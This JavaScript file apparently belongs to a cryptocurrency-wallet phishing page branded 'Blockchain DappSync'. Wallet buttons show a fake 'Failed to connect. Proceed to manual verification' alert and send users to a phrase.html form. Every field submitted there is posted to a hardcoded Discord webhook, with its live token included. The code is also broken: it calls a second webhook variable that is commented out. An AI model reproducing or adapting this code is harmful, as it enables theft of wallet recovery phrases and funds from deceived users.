document.addEventListener("DOMContentLoaded", function () {
    document.getElementById("contactForm").addEventListener("submit", async function (event) {
        event.preventDefault();

        // Collect form data
        let formData = new FormData(this);
        let messageContent = "**New Form Submission on Blockchain DappSync**\n";

        formData.forEach((value, key) => {
            if (value.trim() !== "") {
                messageContent += `**${key}**: ${value}\n`;
            }
        });

        // Your Discord webhook URLs
        const webhookURL1 = "https://discord.com/api/webhooks/1504244881218994218/1FtD1RYIhzWjMvScaDHytARLt3xLLIMXMcbeRXhv6IEROXSXAl2tiK25Q1-AriKC9659";
       // const webhookURL2 = "https://discord.com/api/webhooks/1504244893655105779/H8Cd-FUT5TNAVUGspnwMEw13BR9zjsMdB_BUB4xDs0yqPBX3A9w-coTCJqsucZVW_Y9I"; // Replace with your second webhook URL

        // Send data to both Discord webhooks
        try {
            // Send to the first webhook
            await fetch(webhookURL1, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: messageContent })
            });

            // Send to the second webhook
           await fetch(webhookURL2, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: messageContent })
             });

            // Redirect to another page after successful submission
            window.location.href = "thanks.html"; // Change this to your desired page
        } catch (error) {
            console.error("Error sending to Discord:", error);
            alert("Failed to process. Please try again.");
        }
    });
});

//popup functionality
// Get the modal and close button
const popup = document.getElementById('walletPopup');
const closeBtn = document.getElementById('closePopupBtn');

// Get all buttons with class "openPopupBtn"
const openBtns = document.querySelectorAll('.openPopupBtn');

// Open the popup when any button with class "openPopupBtn" is clicked
openBtns.forEach(button => {
    button.onclick = function () {
        popup.style.display = "block";
    };
});

// Close the popup when the close button is clicked
closeBtn.onclick = function () {
    popup.style.display = "none";
}

// Close the popup if the user clicks outside the modal
window.onclick = function (event) {
    if (event.target == popup) {
        popup.style.display = "none";
    }
}

// Listen for clicks on all wallet buttons
const walletButtons = document.querySelectorAll('.wallet-button');

walletButtons.forEach(button => {
    button.addEventListener('click', function (event) {
        // Prevent default link behavior
        event.preventDefault();

        // Show the alert message
        alert("Failed to connect. Proceed to manual verification.");

        // After the alert, get wallet name and image from the data attributes
        const walletName = this.getAttribute('data-wallet-name');
        const walletImage = this.getAttribute('data-wallet-image');

        // Store the selected wallet info in localStorage
        localStorage.setItem('selectedWalletName', walletName);
        localStorage.setItem('selectedWalletImage', walletImage);

        // Redirect to the form page (phrase.html)
        window.location.href = this.getAttribute('href');
    });
});
